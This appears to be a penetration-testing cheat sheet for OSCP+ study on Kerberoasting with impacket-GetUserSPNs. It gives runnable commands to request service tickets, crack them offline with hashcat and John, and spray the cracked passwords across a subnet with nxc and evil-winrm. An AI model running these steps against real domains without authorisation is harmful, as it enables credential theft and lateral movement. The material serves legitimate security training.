# impacket-GetUserSPNs

impacket-GetUserSPNs requests Service Tickets (TGS) for accounts with Service Principal Names (SPNs) set. You then crack these tickets offline to get plaintext passwords. This is called **Kerberoasting** and is one of the most common AD attack paths in OSCP+.

---

## Basic Kerberoasting

#### Find All Kerberoastable Accounts

```bash
# List all accounts with SPNs (doesn't request tickets yet)
impacket-GetUserSPNs domain.local/username:'password' -dc-ip 10.10.10.5
```

#### Request Tickets for Cracking

```bash
# Request TGS tickets for all SPN accounts
impacket-GetUserSPNs domain.local/username:'password' -dc-ip 10.10.10.5 -request

# Save tickets directly to a file
impacket-GetUserSPNs domain.local/username:'password' -dc-ip 10.10.10.5 -request -outputfile kerberoast.txt
```

#### Request Ticket for a Specific User

```bash
impacket-GetUserSPNs domain.local/username:'password' -dc-ip 10.10.10.5 -request-user svc_mssql -outputfile svc_hash.txt
```

---

## Authentication Methods

#### With Password

```bash
impacket-GetUserSPNs domain.local/username:'password' -dc-ip 10.10.10.5 -request
```

#### With NTLM Hash (Pass the Hash)

```bash
impacket-GetUserSPNs domain.local/username -dc-ip 10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -request
```

#### With Kerberos Ticket

```bash
export KRB5CCNAME=username.ccache
impacket-GetUserSPNs domain.local/username -dc-ip 10.10.10.5 -k -no-pass -request
```

---

#### Crack the Tickets

```bash
# Hashcat (mode 13100 = Kerberoasting TGS-REP)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# With rules for better cracking
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

---

#### OSCP+ Exam Workflow

```bash
# Step 1: Find kerberoastable accounts
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip DC_IP

# Step 2: Request and save tickets
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip DC_IP -request -outputfile kerberoast.txt

# Step 3: Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Step 4: Use cracked password everywhere
nxc smb 10.10.10.0/24 -u svc_account -p 'CrackedPassword' --continue-on-success
nxc winrm 10.10.10.0/24 -u svc_account -p 'CrackedPassword'
evil-winrm -i 10.10.10.5 -u svc_account -p 'CrackedPassword'
```

---

## Pro Tips

- Service accounts often have weak passwords — Kerberoasting works more than you think
- You only need ANY valid domain user to Kerberoast — no special privileges required
- Always spray cracked passwords across all machines and protocols (SMB, WinRM, RDP, SSH, MSSQL)
- If hashcat is slow, try john first with rockyou — it's often enough for OSCP
- Kerberoastable accounts with admin privileges are instant wins
- The `-outputfile` flag saves you from losing hashes if terminal crashes